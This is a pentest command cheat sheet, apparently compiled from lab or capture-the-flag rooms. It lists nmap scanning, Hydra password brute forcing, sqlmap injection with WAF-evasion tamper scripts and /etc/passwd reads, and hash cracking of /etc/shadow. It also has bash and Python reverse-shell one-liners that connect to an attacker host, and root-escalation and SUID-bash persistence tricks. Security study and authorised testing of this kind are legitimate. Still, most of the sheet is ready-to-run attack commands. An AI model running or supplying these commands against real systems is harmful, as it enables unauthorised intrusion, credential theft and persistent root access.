# Pentest Cheatsheet

Working command reference built up across the rooms. Adjust `<ip>`, wordlists and
interfaces to your environment.

## Recon — nmap
```bash
nmap -sC -sV -p- -oN scan.nmap <ip>          # default scripts + versions, all ports
nmap -sS -Pn -p- -T4 -A -oN scan.nmap <ip>   # SYN stealth, no ping, aggressive
nmap -sU --top-ports 50 <ip>                 # top UDP ports
```
- `-sS` SYN scan: never completes the handshake → shows as a dropped SYN in logs,
  quieter than `-sT` (which leaves ESTABLISHED/CLOSED entries).
- Always add non-standard hostnames from TLS certs / redirects to `/etc/hosts`.

## Web content discovery
```bash
gobuster dir  -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,js
gobuster vhost -u http://<ip> -w .../subdomains-top1million-5000.txt
ffuf -u http://<ip>/FUZZ -w common.txt -e .php,.txt
whatweb http://<ip>        # tech fingerprint
nikto -h http://<ip>       # quick vuln scan
```

## Finding exploits
```bash
searchsploit <product> <version>
searchsploit -m <id>       # copy exploit locally
searchsploit -x <id>       # view it
```

## Brute force — Hydra
```bash
# HTTP POST form (most common) — F= / :fail-string marks a failed login
hydra -l admin -P rockyou.txt <ip> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Wrong password"
hydra -L users.txt -P pass.txt ssh://<ip> -t 16
hydra -L users.txt -P pass.txt ftp://<ip>
```
Tuning: `-t` threads, `-w` wait between tries (stay quiet), `-f` stop on first hit.
Build app-specific wordlists with CeWL: `cewl http://<ip> -w words.txt`.

## SQL injection — sqlmap
```bash
sqlmap -u "http://<ip>/page?id=1" --dbs --batch
sqlmap -u "http://<ip>/login" --data="username=a&password=b"   # POST
sqlmap -u "..." --random-agent                                 # evade simple WAF
sqlmap -u "..." --file-read="/etc/passwd"                      # read files
```
Tamper scripts to dodge WAFs: `space2comment`, `base64encode`, `charencode`, `between`.

## Hash cracking — John / Hashcat
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 hash.txt ; john --show hash.txt
unshadow /etc/passwd /etc/shadow > hashes.txt && john hashes.txt
ssh2john id_rsa > h.txt ; zip2john a.zip > h.txt          # convert then crack
hashcat -m 0 -a 0 hash.txt rockyou.txt                   # -m 0 = MD5 dictionary
```

## Reverse shells
```bash
# listener
nc -lvnp 4444
# bash
bash -i >& /dev/tcp/<attacker>/4444 0>&1
# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
# upgrade a dumb shell
python3 -c 'import pty;pty.spawn("/bin/bash")'   # then: Ctrl-Z; stty raw -echo; fg
```

## Linux privilege escalation
```bash
sudo -l                              # what can I run as root?  (GTFOBins each binary)
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
getcap -r / 2>/dev/null               # capabilities
cat /opt/**/.git/config               # leaked creds in exposed git
```
Common wins seen in these rooms:
- `sudo vim -c ':!/bin/bash'` — editors/pagers spawn root shells (GTFOBins).
- `fail2ban-client` sudo → redefine a jail's `actionban` to run your command as root.
- `chmod +s /bin/bash` then `bash -p` — SUID-bash root persistence.

## Useful protocol notes
- **curl** for raw HTTP: `-i` show headers, `-X` method, `-vk` verbose + ignore TLS,
  `--data` POST body. Inspect TLS certs for internal hostnames.
- **-sS vs -sT**: SYN scan is quieter in firewall/IDS logs than a full connect scan.
